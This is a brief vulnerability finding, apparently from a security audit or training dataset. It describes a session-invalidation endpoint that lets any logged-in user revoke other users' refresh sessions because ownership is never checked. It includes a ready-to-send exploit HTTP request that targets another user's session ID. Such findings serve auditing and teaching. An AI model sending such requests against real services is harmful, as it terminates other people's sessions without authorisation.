diagnosis: The logout/invalidation route deletes refresh_session:${sessionId} directly from Redis based on URL path parameters. Although authenticateUser runs, the code does not verify that the target sessionId belongs to req.user.id. Any logged-in user can terminate refresh sessions of arbitrary users by brute-forcing or guessing session IDs.
exploit_request:
POST /api/sessions/sess_user_991823/blacklist HTTP/1.1
Host: auth.portal.io
Authorization: Bearer <attacker_jwt>
Content-Length: 0
